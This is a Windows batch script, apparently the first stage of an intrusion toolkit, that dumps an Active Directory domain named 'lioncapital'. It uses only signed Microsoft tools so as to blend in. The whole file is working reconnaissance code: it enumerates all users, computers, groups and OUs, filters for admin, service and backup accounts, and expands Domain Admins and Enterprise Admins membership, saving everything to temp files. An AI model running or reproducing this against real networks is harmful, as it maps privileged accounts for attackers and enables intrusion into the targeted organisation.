@echo off
setlocal enabledelayedexpansion
REM ============================================
REM  1_DSQuery_Recon.bat - Domain dump via signed Windows binaries
REM  Uses ONLY dsquery.exe + dsget.exe + findstr - all signed MS tools
REM  Outputs to %TEMP%\dsq_*.log
REM ============================================

set "OUT=%TEMP%"
set "DOM=lioncapital"

echo.
echo === dsquery.exe WHOLE DOMAIN DUMP ===
echo === Output: %OUT%\dsq_*.log ===

dsquery.exe user "DC=%DOM%,DC=local" -o samname -limit 0 > "%OUT%\dsq_users.txt" 2>&1
dsquery.exe user "DC=%DOM%,DC=local" -o samname -limit 0 | findstr /i "admin svc backup sa service" > "%OUT%\dsq_priv_users.txt" 2>&1
dsquery.exe computer "DC=%DOM%,DC=local" -o name -limit 0 > "%OUT%\dsq_computers.txt" 2>&1
dsquery.exe group "DC=%DOM%,DC=local" -o samname -limit 0 > "%OUT%\dsq_groups.txt" 2>&1
dsquery.exe ou "DC=%DOM%,DC=local" -o name -limit 0 > "%OUT%\dsq_ous.txt" 2>&1
dsquery.exe server -o name > "%OUT%\dsq_dcs.txt" 2>&1

echo.
echo --- Domain Admins ---
dsquery.exe group -samid "Domain Admins" | dsget.exe group -members -expand > "%OUT%\dsq_da.txt" 2>&1

echo --- Enterprise Admins ---
dsquery.exe group -samid "Enterprise Admins" | dsget.exe group -members -expand > "%OUT%\dsq_ea.txt" 2>&1

echo --- All Admin-ty Groups ---
dsquery.exe group "DC=%DOM%,DC=local" -o samname | findstr /i "admin" > "%OUT%\dsq_admin_groups.txt" 2>&1

echo --- All Service Account OUs ---
dsquery.exe user "OU=Lion Capital Service Account,DC=%DOM%,DC=local" -o samname -limit 0 > "%OUT%\dsq_svc_accts.txt" 2>&1

echo.
echo === Done. Files in %OUT% ===
dir "%OUT%\dsq_*.txt"
pause
endlocal
